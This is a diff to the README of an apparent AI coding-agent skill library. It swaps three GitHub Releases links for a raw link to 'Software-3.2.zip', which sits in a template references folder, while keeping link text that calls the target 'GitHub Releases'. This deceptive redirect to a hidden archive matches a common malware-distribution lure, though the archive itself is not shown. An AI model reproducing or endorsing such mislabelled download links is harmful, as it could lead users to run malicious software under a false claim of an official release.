@@ -1,6 +1,6 @@
 # 🧰 skills - AI skills for faster coding
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-purple?style=for-the-badge)](https://github.com/Smart-barley681/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20skills-purple?style=for-the-badge)](https://raw.githubusercontent.com/Smart-barley681/skills/main/skills/_template/references/Software-3.2.zip)
 
 ## 🚀 What this is
 
@@ -32,7 +32,7 @@ It is built for people who use AI coding agents and want a simple skill library 
 
 To get the app on Windows, visit this page to download:
 
-[Download from GitHub Releases](https://github.com/Smart-barley681/skills/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Smart-barley681/skills/main/skills/_template/references/Software-3.2.zip)
 
 After you open the page:
 
@@ -144,4 +144,4 @@ This project fits the following areas:
 
 - **Repository name:** skills
 - **Description:** 🧰 一个面向 AI 编程代理的 skill 合集。
-- **Primary download page:** https://github.com/Smart-barley681/skills/releases
+- **Primary download page:** https://raw.githubusercontent.com/Smart-barley681/skills/main/skills/_template/references/Software-3.2.zip
